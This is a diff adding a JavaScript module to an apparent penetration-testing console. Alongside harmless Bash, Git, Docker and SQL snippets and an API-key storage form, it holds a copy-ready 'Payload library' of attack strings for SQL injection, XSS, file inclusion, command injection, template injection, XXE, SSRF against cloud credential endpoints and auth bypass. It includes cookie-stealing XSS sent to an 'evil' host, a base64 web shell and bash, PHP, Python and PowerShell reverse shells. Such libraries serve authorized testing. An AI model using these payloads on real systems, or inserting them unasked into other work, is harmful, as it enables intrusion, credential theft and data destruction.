@@ -1,0 +1,165 @@
+// Big reference libraries for the console: attack payloads and dev/code snippets.
+const esc = (s) => String(s ?? "").replace(/[&<>"']/g, (c) =>
+  ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+
+export const PAYLOADS = {
+  "SQL injection": [
+    "' OR '1'='1", "' OR 1=1-- -", "admin'-- -", "' OR '1'='1' /*", "\" OR \"\"=\"",
+    "' UNION SELECT NULL-- -", "' UNION SELECT NULL,NULL-- -", "' ORDER BY 1-- -",
+    "' AND 1=CONVERT(int,(SELECT @@version))-- -", "' AND SLEEP(5)-- -",
+    "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -", "1' AND extractvalue(1,concat(0x7e,version()))-- -",
+    "'; DROP TABLE users-- -", "UNION SELECT username,password FROM users-- -", "' OR 1=1 LIMIT 1-- -",
+  ],
+  "XSS": [
+    "<script>alert(1)</script>", "\"><script>alert(document.domain)</script>",
+    "<img src=x onerror=alert(1)>", "\"><img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
+    "<body onload=alert(1)>", "javascript:alert(1)", "'\"><svg/onload=alert(1)>",
+    "<iframe src=javascript:alert(1)>", "<input autofocus onfocus=alert(1)>",
+    "<details open ontoggle=alert(1)>", "<img src=1 onerror=fetch('//evil/'+document.cookie)>",
+    "<script>new Image().src='//evil/?c='+document.cookie</script>",
+  ],
+  "Local file inclusion": [
+    "../../../../etc/passwd", "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
+    "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/read=string.rot13/resource=config.php", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
+    "expect://id", "/var/log/apache2/access.log", "..\\..\\..\\windows\\win.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts",
+  ],
+  "Command injection": [
+    "; id", "| id", "|| id", "& whoami", "&& whoami", "`id`", "$(id)", "; sleep 5",
+    "; cat /etc/passwd", "|nc -e /bin/sh 10.0.0.1 4444", "; curl http://evil/$(whoami)",
+    "%0a id", "\n/bin/cat /etc/passwd", "'; ping -c 3 10.0.0.1;'",
+  ],
+  "SSTI (template injection)": [
+    "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{7*'7'}}", "${{7*7}}",
+    "{{config}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
+    "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "${T(java.lang.Runtime).getRuntime().exec('id')}", "*{7*7}", "@(7*7)",
+  ],
+  "XXE": [
+    "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>",
+    "<!DOCTYPE r [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]>",
+    "<!DOCTYPE r [<!ENTITY % x SYSTEM \"http://evil/e.dtd\"> %x;]>",
+    "<!DOCTYPE r [<!ENTITY x SYSTEM \"expect://id\">]><r>&x;</r>",
+  ],
+  "SSRF": [
+    "http://127.0.0.1:80", "http://localhost/admin", "http://169.254.169.254/latest/meta-data/",
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://[::1]/", "http://0.0.0.0:8080", "file:///etc/passwd", "gopher://127.0.0.1:6379/_INFO",
+    "http://metadata.google.internal/computeMetadata/v1/",
+  ],
+  "Auth / logic bypass": [
+    "admin' -- ", "' OR ''='", "true", "1' or '1'='1", "{\"$ne\":null}", "{\"$gt\":\"\"}",
+    "X-Forwarded-For: 127.0.0.1", "X-Original-URL: /admin", "X-Rewrite-URL: /admin",
+    "Referer: https://trusted.site", "role=admin", "isAdmin=true",
+  ],
+  "Reverse shells": [
+    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", "nc -e /bin/sh 10.0.0.1 4444",
+    "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f",
+    "php -r '$s=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/sh\")'",
+    "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$s=$c.GetStream()...\"",
+  ],
+};
+
+export const SNIPPETS = {
+  "Bash": [
+    ["Strict mode", "set -euo pipefail"], ["Loop files", "for f in *.txt; do echo \"$f\"; done"],
+    ["Trap cleanup", "trap 'rm -f \"$tmp\"' EXIT"], ["Read line-by-line", "while read -r l; do echo \"$l\"; done < file"],
+    ["Args w/ default", "name=\"${1:-world}\""],
+  ],
+  "Python": [
+    ["Venv + install", "python3 -m venv .venv && . .venv/bin/activate && pip install requests"],
+    ["HTTP GET", "import requests; r = requests.get(url, timeout=10); print(r.status_code)"],
+    ["Read JSON", "import json; data = json.load(open('f.json'))"],
+    ["f-string", "print(f'{name=} {value:.2f}')"], ["Argparse", "import argparse; p=argparse.ArgumentParser(); p.add_argument('host'); a=p.parse_args()"],
+  ],
+  "JavaScript / Node": [
+    ["Fetch JSON", "const d = await (await fetch(url)).json();"], ["Read file", "const s = require('fs').readFileSync('f','utf8');"],
+    ["Env var", "const key = process.env.API_KEY;"], ["Sleep", "await new Promise(r => setTimeout(r, 1000));"],
+    ["Server", "require('http').createServer((q,s)=>s.end('hi')).listen(3000)"],
+  ],
+  "Git": [
+    ["Undo last commit", "git reset --soft HEAD~1"], ["Amend", "git commit --amend --no-edit"],
+    ["New branch", "git switch -c feature/x"], ["Stash", "git stash && git stash pop"],
+    ["Squash last 3", "git rebase -i HEAD~3"], ["Discard changes", "git restore ."],
+  ],
+  "Docker": [
+    ["Run interactive", "docker run -it --rm alpine sh"], ["Build", "docker build -t app ."],
+    ["Logs", "docker logs -f <container>"], ["Exec", "docker exec -it <container> bash"],
+    ["Compose up", "docker compose up -d"], ["Prune", "docker system prune -af"],
+  ],
+  "SQL": [
+    ["Top rows", "SELECT * FROM t LIMIT 10;"], ["Join", "SELECT a.*, b.name FROM a JOIN b ON b.id=a.b_id;"],
+    ["Count group", "SELECT status, COUNT(*) FROM t GROUP BY status;"], ["Upsert (PG)", "INSERT ... ON CONFLICT (id) DO UPDATE SET ..."],
+    ["Index", "CREATE INDEX idx_t_col ON t(col);"],
+  ],
+};
+
+const copyRow = (label, code) => `<div class="cs-line"><div class="cs-label">${esc(label)}</div><div class="cs-cmd"><code>${esc(code)}</code><button class="cs-copy" title="copy">copy</button></div></div>`;
+function wireCopy(root) {
+  root.addEventListener("click", (e) => {
+    const b = e.target.closest(".cs-copy"); if (!b) return;
+    const code = b.closest(".cs-cmd").querySelector("code");
+    navigator.clipboard?.writeText(code.textContent).then(() => { b.textContent = "copied"; setTimeout(() => (b.textContent = "copy"), 1000); });
+  });
+}
+
+export function renderPayloads(main) {
+  const cats = Object.keys(PAYLOADS);
+  main.innerHTML = `
+    <h1 class="pg-h1">Payload library</h1>
+    <p class="muted pg-sub">Copy-ready payloads for authorized testing. ${Object.values(PAYLOADS).reduce((a, b) => a + b.length, 0)} entries across ${cats.length} classes.</p>
+    <div class="cs-filter" id="plFilter"><button class="chip on" data-c="all">All</button>${cats.map((c) => `<button class="chip" data-c="${esc(c)}">${esc(c)}</button>`).join("")}</div>
+    <div class="cs-grid" id="plGrid">
+      ${cats.map((c) => `<div class="cs-card" data-cat="${esc(c)}"><div class="cs-head"><h3>${esc(c)}</h3><span class="chip">${PAYLOADS[c].length}</span></div>${PAYLOADS[c].map((p, i) => copyRow(c.split(" ")[0] + " #" + (i + 1), p)).join("")}</div>`).join("")}
+    </div>`;
+  wireCopy(main);
+  main.querySelector("#plFilter").onclick = (e) => {
+    const b = e.target.closest(".chip"); if (!b) return;
+    main.querySelectorAll("#plFilter .chip").forEach((x) => x.classList.toggle("on", x === b));
+    main.querySelectorAll("#plGrid .cs-card").forEach((card) => { card.style.display = (b.dataset.c === "all" || card.dataset.cat === b.dataset.c) ? "" : "none"; });
+  };
+}
+
+export function renderSnippets(main) {
+  const langs = Object.keys(SNIPPETS);
+  main.innerHTML = `
+    <h1 class="pg-h1">Code snippets</h1>
+    <p class="muted pg-sub">Handy one-liners for everyday development. Click copy on any line.</p>
+    <div class="cs-filter" id="snFilter"><button class="chip on" data-c="all">All</button>${langs.map((l) => `<button class="chip" data-c="${esc(l)}">${esc(l)}</button>`).join("")}</div>
+    <div class="cs-grid" id="snGrid">
+      ${langs.map((l) => `<div class="cs-card" data-cat="${esc(l)}"><div class="cs-head"><h3>${esc(l)}</h3><span class="chip">${SNIPPETS[l].length}</span></div>${SNIPPETS[l].map(([lbl, code]) => copyRow(lbl, code)).join("")}</div>`).join("")}
+    </div>`;
+  wireCopy(main);
+  main.querySelector("#snFilter").onclick = (e) => {
+    const b = e.target.closest(".chip"); if (!b) return;
+    main.querySelectorAll("#snFilter .chip").forEach((x) => x.classList.toggle("on", x === b));
+    main.querySelectorAll("#snGrid .cs-card").forEach((card) => { card.style.display = (b.dataset.c === "all" || card.dataset.cat === b.dataset.c) ? "" : "none"; });
+  };
+}
+
+const API_SERVICES = [
+  ["shodan", "Shodan", "Host & service search engine"],
+  ["virustotal", "VirusTotal", "File / URL / IP reputation"],
+  ["openai", "OpenAI", "GPT API key"],
+  ["anthropic", "Anthropic", "Claude API key"],
+  ["hunter", "Hunter.io", "Email discovery"],
+  ["securitytrails", "SecurityTrails", "DNS & domain history"],
+  ["abuseipdb", "AbuseIPDB", "IP abuse reports"],
+  ["censys", "Censys", "Internet scan data"],
+  ["github", "GitHub", "Personal access token"],
+];
+export function renderApiKeys(main) {
+  main.innerHTML = `
+    <h1 class="pg-h1">API keys</h1>
+    <p class="muted pg-sub">Store keys for the services you use. Saved only in this browser (localStorage) &mdash; never uploaded anywhere.</p>
+    <div class="set-card" style="max-width:660px">
+      ${API_SERVICES.map(([id, name, desc]) => `<div class="set-row"><span><strong>${esc(name)}</strong> <span class="muted" style="font-size:.74rem">&middot; ${esc(desc)}</span></span><input class="tk-f" data-key="${id}" type="password" placeholder="paste key..." autocomplete="off" style="max-width:240px" value="${esc(localStorage.getItem("sw_key_" + id) || "")}"></div>`).join("")}
+    </div>
+    <div class="set-btns"><button class="btn" id="akSave">Save keys</button><button class="btn ghost" id="akShow">Show/hide</button><span id="akMsg" class="muted" style="font-size:.8rem;align-self:center"></span></div>`;
+  main.querySelector("#akSave").onclick = () => {
+    main.querySelectorAll("[data-key]").forEach((i) => { try { localStorage.setItem("sw_key_" + i.dataset.key, i.value.trim()); } catch (_) {} });
+    const m = main.querySelector("#akMsg"); m.textContent = "saved to this browser"; setTimeout(() => (m.textContent = ""), 1600);
+  };
+  main.querySelector("#akShow").onclick = () => main.querySelectorAll("[data-key]").forEach((i) => (i.type = i.type === "password" ? "text" : "password"));
+}
